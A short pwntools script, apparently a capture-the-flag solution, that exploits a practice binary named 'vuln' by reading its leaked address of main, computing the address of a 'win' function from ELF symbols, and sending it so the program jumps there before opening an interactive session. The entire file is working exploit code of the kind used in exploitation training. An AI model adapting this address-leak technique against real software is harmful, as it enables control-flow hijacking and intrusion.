from pwn import *

# Load the ELF binary
binary = ELF('./vuln')  # replace with your binary name


HOST = "..."
PORT = "..."
# p = remote(HOST, PORT)  # replace with your remote server address and port
p = process("./vuln")

p.recvuntil(b"main: ")
main_memory = int(p.recvline().strip(), 16)
print(f"main: {hex(main_memory)}")

main_addr = binary.symbols["main"]
print(f"[*] Address of main: {hex(main_addr)}")

win_addr = binary.symbols["win"]
print(f"[*] Address of win: {hex(win_addr)}")

offset = main_addr - win_addr

print(f"[*] Offset: {hex(offset)}")

print(f"[*] Performing {hex(main_memory)} - {hex(offset)}")
win_memory = main_memory - offset
print(f"[*] got win memory: {hex(win_memory)}")

p.recvuntil(b"Enter the address to jump to, ex => 0x12345: ")
p.sendline(hex(win_memory).encode())
p.interactive()